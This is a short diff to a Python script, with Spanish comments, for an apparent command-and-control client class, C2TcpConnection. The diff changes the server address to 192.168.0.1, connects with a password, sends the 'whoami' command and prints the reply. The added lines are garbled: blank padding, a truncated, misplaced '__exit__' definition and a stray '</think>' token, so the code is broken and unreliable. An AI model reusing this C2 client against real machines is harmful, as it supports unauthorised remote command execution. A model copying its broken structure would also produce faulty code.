@@ -29,8 +29,19 @@ class C2TcpConnection():
         # Cerramos la conexión al salir del bloque "with"
         self.sock.close()
 
-with C2TcpConnection(address="10.10.10.10", port=8001, text="p4ssw0rd") as conn:
+with C2TcpConnection(address="192.168.0.1", port=8001, text="p4ssw0rd") as conn:
     respuesta = conn.receive_response()
     conn.send_command("whoami")
 
 print(respuesta)
+
+
+
+
+
+
+
+
+
+    def __exit__(self, exc_type,
+</think>
